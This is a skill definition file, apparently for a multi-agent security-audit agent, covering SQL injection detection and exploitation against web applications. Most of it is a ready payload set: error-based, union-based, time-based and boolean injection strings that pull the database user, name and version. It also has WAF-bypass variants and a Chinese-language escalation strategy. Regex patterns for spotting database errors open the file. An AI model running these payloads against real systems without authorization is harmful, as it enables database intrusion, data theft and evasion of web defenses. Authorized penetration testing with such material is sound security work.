---
name: webapp-sqli
description: Web应用SQL注入检测与利用
tags: sql, injection, database, mysql, postgresql, mssql, oracle
priority: 90
author: multi-agent-security-audit
---

# Web应用SQL注入检测

针对Web应用的SQL注入漏洞检测技能，覆盖常见注入类型和绕过手法。

## Detect

- SQL syntax.*error
- mysql_fetch
- ORA-\d+
- SQLSTATE
- Unclosed quotation
- syntax error.*SQL
- Warning.*mysql_
- PostgreSQL.*ERROR

## Payloads

### error_based
```
' AND UPDATEXML(1,CONCAT(0x7e,VERSION(),0x7e),1)--
' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))--
' OR EXP(~(SELECT * FROM(SELECT USER())a))--
```

### union_based
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT USER(),DATABASE(),VERSION()--
```

### time_based
```
' AND SLEEP(3)--
' AND BENCHMARK(5000000,MD5('test'))--
1; WAITFOR DELAY '0:0:3'--
```

### boolean_based
```
' AND 1=1--
' AND 1=2--
' AND LENGTH(DATABASE())>0--
```

### waf_bypass
```
' /*!50000AND*/ 1=1--
' %26%26 1=1--
' AnD 1=1--
' aNd 1=1--
```

## Strategy

1. 先用报错注入快速确认（最快出数据）
2. 报错不行换联合注入（批量出数据）
3. 无回显用时间盲注（最稳定）
4. 有WAF时逐步尝试绕过手法
